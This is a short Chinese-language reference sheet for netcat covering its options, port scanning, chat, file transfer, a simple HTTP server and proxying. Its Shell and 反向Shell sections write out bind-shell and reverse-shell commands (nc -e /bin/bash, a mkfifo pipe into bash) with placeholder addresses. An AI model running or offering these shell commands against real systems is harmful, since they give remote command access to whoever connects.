# netcat使用说明

## Options
```
-4          只使用ipv4
-6          只使用ipv6
-b          允许广播
-C          \r\n为行尾
-D          调试开关
-d          不读取stdin
-I length   TCP接收缓存
-i interval 指定时延，发送与接受数据间的
-k          在收到一个链接后，保持监听，与-l结合使用
-l          监听，不能与p s z共用，导致w失效
-n          不执行DNS查询
-O length   TCP发送缓存
-P proxy-username 代理用户名
-p port     端口
-q seconds  EOF后等待秒数，如为负数一直等待
-r          随机端口
-S          开启RFC 2385 TCP MD5签名功能
-s source   指定使用的接口
-T tos      TOS值
-t          
-U          指定使用UNIX Socket
-V          指定使用的路由表
-v          更多输出
-w timeout  时延
-X proto    代理协议
-x ip:port  代理地址
-Z          DCCP模式
-z          不做数据交互
```

## 端口扫描
```
$ nc -zvn ip_address port1-port2
# u 使用UDP，默认TCP
# z 连接成功后立即关闭
# v 使用冗余选项
# n 不要使用DNS方向查询IP地址的域名
# w timeout
```

## 聊天
```
# Server
$ nc -l port
# Client
$ nc ip_address port
```

## 文件传输
```
# Server
$ nc -l port < filename
# Client
$ nc -n ip_address port > filename

# Server
$ nc -l port > filename
# Client
$ nc ip_address port < filename
```

## Shell
```
# Server
$ nc -lk port -e /bin/bash -i
# Client
$ nc ip_address port

# Server
$ mkfifo /tmp/tmp_fifo
$ cat /tmp/tmp_fifo | /bin/bash -i 2>&1 | nc -lk port > /tmp/tmp_fifo
$ Client
$ nc ip_address port
```

## 反向Shell
```
# Server
$ nc -lk port
# Client
$ nc ip_address -e /bin/bash
```

## Telnet
```
nc ip_address 23
```

## 单文件HTTPD
```
$ { echo -ne "HTTP/1.0 200 OK\r\nContent-Length: $(wc -c < filename)\r\n\r\n"; cat filename; } | nc -lk 8080
```

## 代理
```
$ nc -l port | nc www.google.com 80
```


